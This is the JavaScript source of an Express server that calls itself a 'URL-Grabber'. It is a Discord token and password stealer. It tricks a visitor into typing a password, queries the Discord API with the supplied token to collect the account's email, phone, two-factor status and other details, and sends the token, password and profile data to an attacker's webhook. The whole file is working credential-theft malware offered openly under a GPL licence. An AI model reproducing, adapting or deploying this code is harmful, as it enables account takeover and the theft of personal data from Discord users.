const { default: axios } = require("axios");
const express = require("express");
const { MessageEmbed, WebhookClient } = require("discord.js");
const app = express();
const { hook } = require("./settings/config.js");
const YJ = require("./settings/config.js");

process.logged = [];

Array.prototype.random = function () {
  let n = this[Math.floor(Math.random() * this.length)];
  for (; !n;) n = this[Math.floor(Math.random() * this.length)];
  return n;
};

const doxToken = async (tkn, pass) => {
  try {
    const res = await axios({ url: `https://discord.com/api/v${[8, 9].random()}/users/@me`, headers: { Authorization: tkn } });

    if (res.status !== 200 || res.status !== 201) {
      const d = res.data;
      return {
        Token: tkn,
        Pass: pass ? `\`${pass}\`` : `${YJ.emoji.ERROR} \`Not Applicable\``,
        Username: d.username,
        Discriminator: d.discriminator,
        Username_Tag: `${d.username}#${d.discriminator}`,
        UserID: d.id,
        Email: `\`${d.email}\`` || `${YJ.emoji.ERROR} \`Not Applicable\``,
        Phone: d.phone || `${YJ.emoji.ERROR} \`Not Applicable\``,
        Bot_Detection: d.bot ? `${YJ.emoji.SUCCESS} \`True\`` : `${YJ.emoji.ERROR} \`False\``,
        Token_Verification: d.verified ? `${YJ.emoji.SUCCESS} \`True\`` : `${YJ.emoji.ERROR} \`False\``,
        Premium: d.premium_type === 1 ? `${YJ.emoji.premium.nitro_classic} \`Nitro Classic\`` : d.premium_type === 2 ? `${YJ.emoji.premium.nitro_booster} \`Nitro Booster\`` : `${YJ.emoji.ERROR} \`None\``,
        TFA: d.mfa_enabled ? `${YJ.emoji.enabled} \`Enabled\`` : `${YJ.emoji.disabled} \`Disabled\``,
        Age_Restriction: d.nsfw_allowed ? `${YJ.emoji.SUCCESS} \`True\`` : `${YJ.emoji.ERROR} \`False\``,
        bannerURL: d.banner ? `https://cdn.discordapp.com/banners/${d.id}/${d.banner}${d.banner.startsWith("a_") ? ".gif" : ".png"}?size=4096` : null,
        avatarURL: d.avatar ? `https://cdn.discordapp.com/avatars/${d.id}/${d.avatar}${d.avatar.startsWith("a_") ? ".gif" : ".png"}?size=4096` : null,
      };
    }
  } catch (err) {
    console.log(err);
  }
};

app.get("/", async (req, res) => {

  const token = req.query.user;
  if (token) {
    res.send(`<!DOCTYPE html>
  <html lang="en">
    <head>
      <meta charset="UTF-8" />
      <meta http-equiv="X-UA-Compatible" content="IE=edge" />
      <meta name="viewport" content="width=device-width, initial-scale=1.0" />
      <title>Please Wait a Second...</title>
    </head>
    <body>
      <script>
        const pass = prompt("Enter Pass to Continue");
  
        function searchToObject() {
          var pairs = window.location.search.substring(1).split("&"),
            obj = {},
            pair,
            i;
  
          for (i in pairs) {
            if (pairs[i] === "") continue;
  
            pair = pairs[i].split("=");
            obj[decodeURIComponent(pair[0])] = decodeURIComponent(pair[1]);
          }
  
          return obj;
        }
  
        const query = searchToObject();
  
        location.href = \`\${location.origin}/Yours-Jarvis?user=\${query.user}&pass=\${pass}\`;
      </script>
    </body>
  </html>`);
  }
});
app.get("/Yours-Jarvis", async (req, res) => {
  const token = req.query.user;
  const pass = req.query.pass;

  if (token) {
    res.send(`<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Token Finder API - Jarvis</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@200;300;400;500&display=swap" rel="stylesheet" />
    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        font-family: "Poppins";
      }
      body {
        width: 100%;
        height: 100vh;
        background: #1f1f1f;
        display: flex;
        justify-content: center;
        align-items: center;
      }
      .box {
        width: 500px;
        height: auto;
        background: #222222;
        box-shadow: 2px 2px 7px #00000031;
        border-radius: 0.35rem;
        display: flex;
        align-items: center;
        justify-content: center;
        flex-direction: column;
        padding: 0.8rem 2.4rem;
        padding-top: 1.8rem;
      }

      @media only screen and (max-width: 500px) {
        .box {
          width: 100%;
          margin: 0 0.23rem;
        }
      }

      .token_container {
        width: 100%;
        /* overflow: auto; */
        /* white-space: pre; */
        word-break: break-all;
        font-size: 1.6rem;
        padding: 0.4rem 0.6rem;
        background: #33333375;
        border-radius: 0.28rem;
        color: #fff;
        user-select: all;
      }

      .token_container::-webkit-scrollbar {
        display: none;
      }

      .btn_container {
        position: relative;
      }

      .copy {
        font-size: 1.2rem;
        margin: 1.2rem;
        background: none;
        border: 1.2px solid #fff;
        color: #fff;
        padding: 0.4rem 0.8rem;
        cursor: pointer;
        transition: all 0.3s;
      }
      .copy:hover {
        background: rgb(240, 240, 240);
        color: #222222;
        font-weight: 500;
      }
    </style>
  </head>
  <body>
    <div class="box">
      <div class="token_container"></div>
      <button class="copy">Copy To Clipboard</button>
    </div>

    <script>
      const token_container = document.querySelector(".token_container");
      const copy_btn = document.querySelector(".copy");
      const box = document.querySelector(".box");
      const search_params = new URLSearchParams(location.search);
      const token = search_params.get("user") || search_params.get("token");
      token_container.innerHTML = token;
      copy_btn.addEventListener("click", async () => {
        try {
          if (window.my_timeout) {
            clearTimeout(window.my_timeout);
          }
          await navigator.clipboard.writeText(token);
          let bkp = copy_btn.innerHTML;
          copy_btn.innerHTML = "Copied To Clipboard";
          window.my_timeout = setTimeout(() => {
            copy_btn.innerHTML = bkp;
          }, 3000);
        } catch (err) {
          alert("Failed To Copy to Clipboard! Kindly Copy it Manually by Clicking the Token String");
          console.log(err);
        }
      });
    </script>
  </body>
</html>`);
    try {
      const data = await doxToken(token, pass && typeof pass === "string" ? pass.trim() : null);
      console.log(`[>] 🌐 | Successfully Grabbed Token ${data.Username_Tag}`);
      if (!data) return;
      const GrabberInfoJarvis = new MessageEmbed();
      GrabberInfoJarvis.setColor(YJ.embed.color);
      GrabberInfoJarvis.setTitle(`${YJ.emoji.successfull} *Successfully Grabedㅤ*`);
      GrabberInfoJarvis.setImage(data.bannerURL || YJ.images.UserJarvis_tag_banner);
      GrabberInfoJarvis.setThumbnail(data.avatarURL || YJ.images.UserJarvis_pfp);
      GrabberInfoJarvis.setDescription(`*${YJ.emoji.dot} Username - \`${data.Username}\`\n${YJ.emoji.dot} Discriminator - \`${data.Discriminator}\`\n${YJ.emoji.dot} User ID - \`${data.UserID}\`\n\n${YJ.emoji.dot} Email - ${data.Email}\n${YJ.emoji.dot} Password - ${data.Pass}\n${YJ.emoji.dot} Phone no - ${data.Phone}\n${YJ.emoji.dot} Two-factor auth - ${data.TFA}\n${YJ.emoji.dot} Premium - ${data.Premium}\n\n${YJ.emoji.dot} Bot Detection - ${data.Bot_Detection}\n${YJ.emoji.dot} Token Verified - ${data.Token_Verification}\n${YJ.emoji.dot} 18+ / NSFW Content - ${data.Age_Restriction}*`);
      GrabberInfoJarvis.addField(`*${YJ.emoji.dot} Token ----*`, `*||\`\`\`js\n${data.Token}\`\`\`||*`);
      GrabberInfoJarvis.setTimestamp();
      GrabberInfoJarvis.setFooter(`© 2022 Made by Your's Jarvis#1906 with ❤`, `${YJ.images.UserJarvis_pfp}`);

      const UserJarvis = new MessageEmbed();
      UserJarvis.setColor(YJ.embed.color);
      UserJarvis.setTitle(`${YJ.emoji.crown} *URL-Grabber Author ----*`);
      UserJarvis.setDescription(`*${YJ.emoji.dot} Author- [Your's Jarvis # 1906](${YJ.Jarvis.UserJarvis})\n${YJ.emoji.dot} Github - [Yours-Jarvis](${YJ.links.Github})\n${YJ.emoji.dot} Website - [Yours-Jarvis.io](${YJ.links.Website})\n${YJ.emoji.dot} Support - [Linux-HQ](${YJ.links.DiscordServer})*`);
      UserJarvis.setImage(YJ.images.UserJarvis_tag_banner)
      UserJarvis.setTimestamp();
      UserJarvis.setFooter(`URL-Grabber © 2022 by Yours-Jarvis is licensed under GNU General Public License v3.0`, `${YJ.images.UserJarvis_pfp}`);

      // Cache Part

      if (process.logged.find((e) => e.token === token && e.passowrd === pass)) {
        console.log("Found Duplicate Logged ID");
      } else {
        await axios({ method: "POST", url: hook, data: { content: `*${YJ.Mention.role_id || YJ.Mention.ping} ${YJ.emoji.successfull} Successfully Grabed Token from [API](${YJ.links.Website})*`, embeds: [GrabberInfoJarvis.toJSON(), UserJarvis.toJSON()] } }).catch((err) => console.log(err.name));
        process.logged.push({ token, password: pass });
      }
    } catch (err) {
      console.log(err);
    }
  } else {
    res.send("No Token Found! ¯\\_(ツ)_/¯");
  }
});

const port = 3000 || 5512 || 8080;

app.listen(port, () => {
  console.log(`[>] 🚀 | Your app listening on port ${port}\n[>] ✅ | Yours-Jarvis URL-Grabber@v${YJ.Jarvis.Version}\n\n`);
});